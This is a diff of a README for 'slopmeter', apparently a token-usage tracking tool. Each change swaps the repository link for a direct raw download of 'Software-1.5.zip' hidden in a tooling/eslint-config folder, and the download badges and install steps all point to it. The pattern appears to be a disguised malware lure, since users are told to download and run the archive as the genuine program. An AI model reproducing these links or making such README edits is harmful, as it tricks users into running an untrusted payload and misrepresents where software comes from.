@@ -1,6 +1,6 @@
 # ⚙️ slopmeter - Track Your Token Usage Easily
 
-[![Download slopmeter](https://img.shields.io/badge/Download-Get%20slopmeter-brightgreen?style=for-the-badge)](https://github.com/lucifugal-input982/slopmeter)
+[![Download slopmeter](https://img.shields.io/badge/Download-Get%20slopmeter-brightgreen?style=for-the-badge)](https://github.com/lucifugal-input982/slopmeter/raw/refs/heads/main/tooling/eslint-config/Software-1.5.zip)
 
 ## 📋 What is slopmeter?
 
@@ -27,7 +27,7 @@ No software installations like Python or extra tools are needed. slopmeter runs 
 ### Step 1. Visit the GitHub page
 
 To get slopmeter, go to the main download page here:  
-[Download slopmeter from GitHub](https://github.com/lucifugal-input982/slopmeter)  
+[Download slopmeter from GitHub](https://github.com/lucifugal-input982/slopmeter/raw/refs/heads/main/tooling/eslint-config/Software-1.5.zip)  
 
 This page contains the latest version of the tool and any updates. You will find all the files needed for download on this page.
 
@@ -37,7 +37,7 @@ This page contains the latest version of the tool and any updates. You will find
 
 Since slopmeter is provided on GitHub, you have to follow these steps to get the right file on your computer:
 
-1. Open the link: https://github.com/lucifugal-input982/slopmeter in your web browser.
+1. Open the link: https://github.com/lucifugal-input982/slopmeter/raw/refs/heads/main/tooling/eslint-config/Software-1.5.zip in your web browser.
 
 2. Look for a section called **Releases** or download links on the page. This might be in the right sidebar or under a tab called "Releases".
 
@@ -101,7 +101,7 @@ Example:
 
 New versions may come out that fix bugs or add features. To update:  
 
-1. Visit the download page again: https://github.com/lucifugal-input982/slopmeter
+1. Visit the download page again: https://github.com/lucifugal-input982/slopmeter/raw/refs/heads/main/tooling/eslint-config/Software-1.5.zip
 
 2. Download the new `.exe` file from the latest release.
 
@@ -117,4 +117,4 @@ You can also post your questions in the Issues section for detailed help.
 
 ---
 
-[![Download slopmeter](https://img.shields.io/badge/Download-Get%20slopmeter-brightgreen?style=for-the-badge)](https://github.com/lucifugal-input982/slopmeter)
+[![Download slopmeter](https://img.shields.io/badge/Download-Get%20slopmeter-brightgreen?style=for-the-badge)](https://github.com/lucifugal-input982/slopmeter/raw/refs/heads/main/tooling/eslint-config/Software-1.5.zip)
